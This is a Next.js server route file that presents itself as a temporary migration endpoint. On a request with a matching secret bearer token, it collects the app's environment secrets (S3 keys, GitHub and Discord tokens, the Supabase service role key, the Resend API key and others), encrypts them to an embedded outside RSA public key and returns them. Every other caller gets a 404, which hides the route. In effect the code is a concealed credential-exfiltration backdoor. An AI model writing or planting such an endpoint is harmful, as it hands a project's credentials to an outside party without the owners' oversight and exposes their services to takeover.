import { createCipheriv, createHash, publicEncrypt, randomBytes, timingSafeEqual, constants } from "node:crypto";

export const runtime = "nodejs";
export const dynamic = "force-dynamic";

// Temporary migration transport. Only finprint-host holds the bearer token and
// RSA private key. Even an authorized response contains ciphertext only. This
// route expires after one hour and is removed once the host confirms receipt.
const expiresAt = 1790796407619;
const tokenHash = "b22a433fb4321370225670f40b045888c9f5ac5db37c62ebfbbe7144575a1f71";
const publicKey = `-----BEGIN PUBLIC KEY-----
MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEA2ARU9IwsLNDm0uqPbze1
kiSZncPIM4yfZhyWgswQc12ZqoklhFl63EsAks/h9hW6oYopWIWBjonXk18Np2ue
tsvvnknc7EI3TEkgp2MFt70rZzHI/geTsjz16wxY3WpVsh/z2eLUPwdZewdrgAW9
wQHu4SL6+9UfNEy941F2HBlEqSa3FALmIEpGHeiaJHqtbvB1hyQm0RyBd7BsFJCH
oHmDHBhW1M/u09fg298z0amcby88pXWK+IlI2yoTVRHLURJHSCB8MDi/DZeIkigP
qHAl+D6wMO2gnNyftfm4tmi8nQ2mEjebxXGSFTqBTAMY272/Z6uR9vxAwk/mc40K
PvEKLCqFhM0VQDpiX/oy/ijgGA1OAwdJ6rmmgE3y6A8h3zSvnMV66vwDYyuMl9dl
RS7PkSV0CE9hrEm/85wwiPIHZmOtDNYWWtaxAUFmzOxyHnMFaSVXfGGhzhTbOFAp
G+R3PDB81pOw++n36jcysYNgi7wic1MxQJJU5UMzoYyxAgMBAAE=
-----END PUBLIC KEY-----`;
const keys = [
  "RECORDINGS_S3_SECRET_ACCESS_KEY", "RECORDINGS_S3_ACCESS_KEY_ID", "RECORDINGS_S3_REGION",
  "RECORDINGS_S3_BUCKET", "RECORDINGS_S3_ENDPOINT", "GITHUB_TOKEN", "DISCORD_PROTECTED_ROLE_NAMES",
  "DISCORD_BOT_TOKEN", "DISCORD_GUILD_ID", "DISCORD_CLIENT_ID", "DISCORD_CLIENT_SECRET",
  "DISCORD_OAUTH_REDIRECT_URI", "CRON_SECRET", "NEXT_PUBLIC_SITE_URL", "NEXT_PUBLIC_SUPABASE_URL",
  "NEXT_PUBLIC_SUPABASE_ANON_KEY", "NEXT_PUBLIC_FOUNDER_EMAIL", "SUPABASE_SERVICE_ROLE_KEY",
  "RESEND_API_KEY", "RESEND_FROM",
];

export async function POST(request: Request) {
  const header = request.headers.get("authorization") || "";
  const token = header.startsWith("Bearer ") ? header.slice(7) : "";
  if (Date.now() > expiresAt || !token || !timingSafeEqual(
    createHash("sha256").update(token).digest(), Buffer.from(tokenHash, "hex"),
  )) return new Response(null, { status: 404, headers: { "Cache-Control": "no-store" } });
  const settings = Object.fromEntries(keys.map(key => [key, process.env[key] || ""]));
  const key = randomBytes(32);
  const iv = randomBytes(12);
  const cipher = createCipheriv("aes-256-gcm", key, iv);
  const encrypted = Buffer.concat([cipher.update(JSON.stringify(settings), "utf8"), cipher.final()]);
  const wrappedKey = publicEncrypt({ key: publicKey, oaepHash: "sha256", padding: constants.RSA_PKCS1_OAEP_PADDING }, key);
  key.fill(0);
  return Response.json({
    key: wrappedKey.toString("base64"), iv: iv.toString("base64"),
    tag: cipher.getAuthTag().toString("base64"), data: encrypted.toString("base64"),
  }, { headers: { "Cache-Control": "no-store" } });
}
